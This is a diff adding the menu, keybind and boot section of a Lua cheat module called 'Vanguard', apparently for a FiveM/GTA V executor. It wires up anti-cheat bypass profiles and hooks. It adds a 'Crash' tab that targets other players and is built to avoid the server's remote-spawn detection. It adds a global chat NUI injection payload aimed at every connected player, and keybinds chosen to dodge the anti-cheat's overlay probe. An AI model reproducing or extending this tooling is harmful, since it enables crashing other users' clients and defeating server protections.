+-- --- Bypass ----------------------------------------------------------------
+-- Per-guard profiles, plus the global pass. The global pass is the one most
+-- people should use: it applies the generic profile and then every profile it
+-- actually found a resource for, so nothing is applied blind.
+local profileNames = {}
+local profileKeys = {}
+
+do
+    local keys = {}
+    for key in pairs(V.profiles) do keys[#keys + 1] = key end
+    table.sort(keys)
+    for i = 1, #keys do
+        profileKeys[#profileKeys + 1] = keys[i]
+        profileNames[#profileNames + 1] = V.profiles[keys[i]].label
+    end
+end
+
+local manualProfile = { name = "Profile (manual)", type = "selector",
+    options = profileNames, selected = 1 }
+
+local globalToggle = { name = "Global bypass", type = "toggle", value = false, onClick = function(v)
+    if not v then
+        S.suppressOn = false
+        S.disableOverlayProbe = false
+        for name in pairs(H.flags) do H.flags[name] = false end
+        H.remove()
+        return
+    end
+
+    V.applyGlobal()
+    hooksItem.value = H.installed() > 0
+    suppressItem.value = S.suppressOn
+end }
+
+local applyManual = { name = "Apply selected profile", type = "action", onClick = function()
+    local key = profileKeys[math.max(1, math.min(#profileKeys, manualProfile.selected or 1))]
+    local ac = S.primary()
+
+    -- Manual profile on a detected guard: use its resource, its vendor key
+    -- overridden. On no guard: simulate against the local state so the
+    -- operator can still see what the profile would arm.
+    if ac then
+        local original = ac.vendor
+        ac.vendor = key
+        local plan = V.apply(ac)
+        ac.vendor = original
+        if plan then
+            hooksItem.value = H.installed() > 0
+            suppressItem.value = S.suppressOn
+            O.log("manual profile %s -> tier %d", plan.label, plan.tier)
+        end
+    else
+        O.log("manual profile %s: no guard resource found", key)
+    end
+end }
+
+local reportAction = { name = "Write guard report", type = "action", onClick = function()
+    local lines = V.report()
+    for i = 1, #lines do O.log("report: %s", lines[i]) end
+end }
+
+local bypassItems = {
+    { name = "", isSeparator = true, separatorText = "Mode" },
+    globalToggle,
+    reportAction,
+    { name = "", isSeparator = true, separatorText = "Per guard" },
+    manualProfile,
+    applyManual,
+}
+
+-- Per-guard entries are added at registration time, after the boot scan, so
+-- they reflect what is actually running. The manual profile covers the case
+-- where the operator knows the guard before the scan does.
+local guardEntriesAdded = false
+
+local function addGuardEntries()
+    if guardEntriesAdded then return end
+    guardEntriesAdded = true
+
+    if #S.acs == 0 then
+        bypassItems[#bypassItems + 1] = { name = "No guard detected yet", type = "action", onClick = function()
+            S.scan()
+            guardItem.name = ("Guard: %s"):format(S.describe())
+        end }
+        return
+    end
+
+    for i = 1, #S.acs do
+        local ac = S.acs[i]
+        local profile = V.profiles[ac.vendor] or V.profiles.generic
+        bypassItems[#bypassItems + 1] = {
+            name = ("Load: %s"):format(profile.label),
+            type = "action",
+            onClick = function()
+                local plan = V.apply(ac)
+                if plan then
+                    hooksItem.value = H.installed() > 0
+                    suppressItem.value = S.suppressOn
+                    O.log("loaded %s (tier %d, %d hooks)", plan.label, plan.tier, plan.hooks)
+                end
+            end,
+        }
+    end
+end
+
+-- --- Divergence ------------------------------------------------------------
+shellSelector = { name = "Shell model", type = "selector",
+    options = D.shellModelList(), selected = 1 }
+
+shellToggle = { name = "Cosmetic shell", type = "toggle", value = false, onClick = function(v)
+    if v then
+        local model = shellFromIndex(shellSelector.selected)
+        local ok, err = D.attachShell(model)
+        if not ok then
+            shellToggle.value = false
+            O.log("shell refused: %s", tostring(err))
+        end
+    else
+        D.detachShell()
+    end
+end }
+
+platformItem = { name = "Ghost platform", type = "toggle", value = false, onClick = function(v)
+    platformItem.value = F.togglePlatform()
+end }
+
+ghostItems = {
+    { name = "", isSeparator = true, separatorText = "Cover" },
+    shellSelector,
+    shellToggle,
+    { name = "", isSeparator = true, separatorText = "Platform" },
+    platformItem,
+    { name = "Ramp at crosshair", type = "action", onClick = function() F.ramp() end },
+    { name = "Wall at crosshair", type = "action", onClick = function() F.wall() end },
+    { name = "Ghost bridge", type = "action", onClick = function() F.bridge() end },
+    { name = "", isSeparator = true, separatorText = "Movement" },
+    { name = "Blink (18 m)", type = "action", onClick = function() M.blink(18.0) end },
+    { name = "Warp to waypoint", type = "action", onClick = function()
+        local point = M.waypoint()
+        if point then M.warp(point) else O.log("no waypoint") end
+    end },
+}
+
+-- --- Sandbox ---------------------------------------------------------------
+weatherSelector = { name = "Weather", type = "selector",
+    options = { "Off", "THUNDER", "RAIN", "FOGGY", "SMOG", "CLEAR", "XMAS", "HALLOWEEN" },
+    selected = 1, onClick = function(index)
+        local value = weatherSelector.options[index]
+        if value == "Off" or value == nil then
+            F.weatherBubble("off")
+        else
+            F.weatherBubble(value)
+        end
+    end }
+
+timeSlider = { name = "Hour", type = "slider", value = 12.0, min = 0.0, max = 23.0, step = 1.0 }
+
+sandboxItems = {
+    { name = "", isSeparator = true, separatorText = "Vehicle" },
+    { name = "Vehicle ramp (networked)", type = "toggle", value = false, onClick = function(v)
+        if v then
+            local ok = F.toggleVehicleRamp()
+            if not ok then O.log("ramp: get in a vehicle first") end
+        else
+            F.toggleVehicleRamp()
+        end
+    end },
+    { name = "Clear ramps", type = "action", onClick = function() F.clearRamps() end },
+    { name = "", isSeparator = true, separatorText = "Framework props" },
+    { name = "ox_lib ramp (attributed)", type = "action", onClick = function()
+        local ok = F.progressRamp()
+        O.log("ox_lib ramp: %s", tostring(ok))
+    end },
+    { name = "ox_lib prop: box", type = "action", onClick = function()
+        F.progressProp("xm3_prop_xm3_box_wood03a", false)
+    end },
+    { name = "ox_lib prop: cone", type = "action", onClick = function()
+        F.progressProp("prop_roadcone02a", false)
+    end },
+    { name = "ox_lib clear", type = "action", onClick = function() F.clearProgressProp() end },
+    { name = "", isSeparator = true, separatorText = "Physics" },
+    { name = "Prop cannon", type = "action", onClick = function() F.cannon() end },
+    { name = "Vacuum", type = "action", onClick = function() F.vacuum() end },
+    { name = "Trampoline", type = "action", onClick = function() F.trampoline() end },
+    { name = "Elevator +25m", type = "action", onClick = function() F.elevator(25.0) end },
+    { name = "Riot", type = "action", onClick = function() F.riot() end },
+    { name = "", isSeparator = true, separatorText = "Bodies" },
+    { name = "Second body", type = "action", onClick = function() F.secondBody() end },
+    { name = "Aquarium (shark)", type = "action", onClick = function() F.aquarium("shark") end },
+    { name = "Aquarium (orca)", type = "action", onClick = function() F.aquarium("orca") end },
+    { name = "", isSeparator = true, separatorText = "World" },
+    weatherSelector,
+    timeSlider,
+    { name = "Apply hour", type = "action", onClick = function()
+        F.timeBubble(readSlider(timeSlider, 12.0))
+    end },
+    { name = "Clear world overrides", type = "action", onClick = function()
+        F.weatherBubble("off")
+        F.timeBubble(nil)
+        F.blackout(false)
+    end },
+    { name = "Blackout", type = "toggle", value = false, onClick = function(v) F.blackout(v) end },
+}
+
+-- --- Crash ---------------------------------------------------------------
+-- Target-relative load. The operator never moves; every entity is born near
+-- the operator and moved to the target, so the server's "remote spawn"
+-- signature never fires. See src/10_crash.lua for the budget and channels.
+local crashTargetItem
+crashTargetItem = { name = "Target: nearest", type = "action", onClick = function()
+    C.cycle()
+    crashTargetItem.name = ("Target: %s"):format(C.targetLabel())
+end }
+
+local crashMethodItem = { name = "Method", type = "selector", options = {}, selected = 1,
+    onClick = function(index) C.setMethod(index) end }
+for i = 1, #C.METHODS do crashMethodItem.options[i] = C.METHODS[i].label end
+
+local crashIntensityItem = { name = "Intensity", type = "selector",
+    options = { "Light", "Standard", "Heavy", "Overkill" }, selected = 2,
+    onClick = function(index) C.setIntensity(index) end }
+
+crashStatusItem = { name = "Crash: idle", type = "action", onClick = function()
+    O.log(C.status())
+end }
+
+local chatPresetItem = { name = "Payload", type = "selector", options = {}, selected = 1,
+    onClick = function(index) C.chatPreset = index end }
+for i = 1, #C.chatPresets do chatPresetItem.options[i] = C.chatPresets[i].label end
+
+crashItems = {
+    { name = "", isSeparator = true, separatorText = "Target" },
+    crashTargetItem,
+    { name = "Probe channels", type = "action", onClick = function() C.probe() end },
+    { name = "", isSeparator = true, separatorText = "Load" },
+    crashMethodItem,
+    crashIntensityItem,
+    { name = "Launch crash", type = "action", onClick = function()
+        C.setMethod(crashMethodItem.selected or 1)
+        C.setIntensity(crashIntensityItem.selected or 2)
+        if not C.launch() then O.log("crash: not started") end
+    end },
+    { name = "Stop + clean", type = "action", onClick = function() C.stop() end },
+    crashStatusItem,
+    { name = "", isSeparator = true, separatorText = "Global (experimental)" },
+    chatPresetItem,
+    { name = "Self-shield (chat injection)", type = "toggle", value = true,
+        onClick = function(v) C.chatShield = v end },
+    { name = "Send global chat NUI", type = "action", onClick = function()
+        C.chatPreset = chatPresetItem.selected or 1
+        C.sendGlobal()
+    end },
+    { name = "Chat vector hits everyone, including you", type = "action", onClick = function()
+        O.log("crash chat: shield drops the nonce locally; without it the payload renders here too")
+    end },
+}
+
+-- --- Sentinel -------------------------------------------------------------
+sentinelItems = {
+    { name = "Pool watchdog", type = "toggle", value = false, onClick = function(v)
+        SN.flags.watch = v
+        if v then SN.log() end
+    end },
+    { name = "Cull strays now", type = "action", onClick = function()
+        SN.cull()
+        SN.log()
+    end },
+    { name = "Snapshot pools", type = "action", onClick = function() SN.log() end },
+    { name = "", isSeparator = true, separatorText = "Server" },
+    { name = "guard/ limits: 28 / 10s", type = "action", onClick = function()
+        O.log("server guard: ensure guard; console /guard stats")
+    end },
+}
+
+-- --- Debug ----------------------------------------------------------------
+debugItems = {
+    { name = "Scan guards", type = "action", onClick = function()
+        S.scan()
+        guardItem.name = ("Guard: %s"):format(S.describe())
+    end },
+    { name = "Snapshot events", type = "action", onClick = function()
+        local n = S.eventSnapshot()
+        O.log("events: %d", n)
+    end },
+    { name = "Print report", type = "action", onClick = function()
+        O.log("tier=%d hooks=%d live=%d guard=%s",
+            O.tier, H.installed(), E.live(), S.describe())
+    end },
+    { name = "Panic", type = "action", onClick = function() UI.panic() end },
+}
+
+-- ---------------------------------------------------------------------------
+-- REGISTER
+-- ---------------------------------------------------------------------------
+local function register()
+    if type(Menu) ~= "table" or type(Menu.Categories) ~= "table" then
+        return false
+    end
+
+    addGuardEntries()
+
+    local category = {
+        name = "Vanguard",
+        hasTabs = true,
+        tabs = {
+            { name = "Bypass",     items = bypassItems },
+            { name = "Evasion",    items = evasionItems },
+            { name = "Staff",      items = staffItems },
+            { name = "Shield",     items = shieldItems },
+            { name = "Divergence", items = ghostItems },
+            { name = "Sandbox",    items = sandboxItems },
+            { name = "Crash",      items = crashItems },
+            { name = "Sentinel",   items = sentinelItems },
+            { name = "Debug",      items = debugItems },
+        },
+    }
+
+    -- library.lua exposes AddCategory/FindItem. Use them when present so the
+    -- loader does not need to know the category array layout; keep the direct
+    -- path for older library builds.
+    if type(Menu.AddCategory) == "function" then
+        Menu.AddCategory(category)
+    else
+        local replaced = false
+        for i = 1, #Menu.Categories do
+            if Menu.Categories[i].name == "Vanguard" then
+                Menu.Categories[i] = category
+                replaced = true
+                break
+            end
+        end
+        if not replaced then Menu.Categories[#Menu.Categories + 1] = category end
+    end
+
+    -- The loader's own "Crash Method" action is now a second entry point to
+    -- the same engine, so the old tab is not a dead button next to the new one.
+    local legacy = type(Menu.FindItem) == "function"
+        and Menu.FindItem("Online", "Troll", "Crash Method") or nil
+    if legacy then
+        legacy.onClick = function() C.launch() end
+    else
+        for _, cat in ipairs(Menu.Categories) do
+            if cat.tabs then
+                for _, tab in ipairs(cat.tabs) do
+                    for _, item in ipairs(tab.items or {}) do
+                        if item.name == "Crash Method" and item.type == "action" then
+                            item.onClick = function() C.launch() end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- RENDER (overlay only). Small status strip so the operator can see the tier
+-- and the guard without opening the console.
+-- ---------------------------------------------------------------------------
+local previousOnRender = type(Menu) == "table" and Menu.OnRender or nil
+
+if type(Menu) == "table" then
+Menu.OnRender = function()
+    if previousOnRender then
+        pcall(previousOnRender)
+    end
+
+    if not O.has("DrawText") then return end
+
+    local lines = {
+        ("VGD  t%d  h%d  e%d"):format(O.tier, H.installed(), E.live()),
+    }
+    if #S.acs > 0 then
+        lines[#lines + 1] = ("guard %s"):format(S.acs[1].vendor)
+    end
+    if SN.flags.show then
+        lines[#lines + 1] = SN.line()
+    end
+    if A.flags.ghost or A.flags.harden or A.flags.firewall then
+        lines[#lines + 1] = A.status()
+    end
+
+    for i = 1, #lines do
+        pcall(Susano.DrawText, 18, 12 + (i - 1) * 16, lines[i], 13, 0.85, 0.7, 0.25, 0.9)
+    end
+end
+end
+
+-- ---------------------------------------------------------------------------
+-- KEYBINDS. Never Insert, PageUp or PageDown: those three are exactly what the
+-- reference guard's overlay probe watches. F7 is a panic, F8 toggles the
+-- platform.
+-- ---------------------------------------------------------------------------
+local VK = { PANIC = 0x76, PLATFORM = 0x77 }
+
+local function keyDown(code)
+    if not O.has("GetAsyncKeyState") then return false end
+    local ok, _, pressed = pcall(Susano.GetAsyncKeyState, code)
+    return ok and pressed == true
+end
+
+local lastPanic = 0
+local lastPlatform = 0
+
+function UI.tick()
+    local now = O.now()
+
+    if keyDown(VK.PANIC) and now - lastPanic > 900 then
+        lastPanic = now
+        UI.panic()
+    end
+
+    if keyDown(VK.PLATFORM) and now - lastPlatform > 400 then
+        lastPlatform = now
+        platformItem.value = F.togglePlatform()
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- BOOT
+-- ---------------------------------------------------------------------------
+function UI.boot()
+    O.thread()
+    A.boot()
+
+    S.scan()
+    guardItem.name = ("Guard: %s"):format(#S.acs > 0 and S.describe() or "none")
+
+    O.every("shield", 5200, function()
+        S.tick()
+    end, 1200)
+
+    O.every("divergence", 33, function()
+        D.tick()
+        F.platformTick()
+        F.floorTick()
+        F.rampTick()
+        H.tick()
+    end, 40)
+
+    O.every("sweep", 1400, function()
+        E.sweep()
+    end, 300)
+
+    SN.snapshot()
+    O.every("sentinel", 2000, function()
+        SN.tick()
+    end, 700)
+
+    O.every("keys", 90, function()
+        UI.tick()
+    end, 50)
+
+    O.every("crashui", 900, function()
+        crashStatusItem.name = C.status()
+    end, 300)
+
+    O.every("evasionui", 900, function()
+        evasionStatusItem.name = A.status()
+    end, 550)
+
+    O.every("staffui", 5000, function()
+        staffStatusItem.name = ST.status()
+    end, 2400)
+
+    O.every("scan", 30000, function()
+        if #S.acs == 0 then S.scan() end
+    end, 4000)
+
+    if not register() then
+        O.log("menu not reachable - module running headless")
+    end
+
+    O.log("vanguard %s loaded - guard: %s", O.version, S.describe())
+end
+
+UI.boot()
+
+return UI
+
+end)(O,H,S,E,D,F,V,M,SN,C,A,ST,Menu)
+
+
+end)()
+-- <<< VANGUARD MODULE END
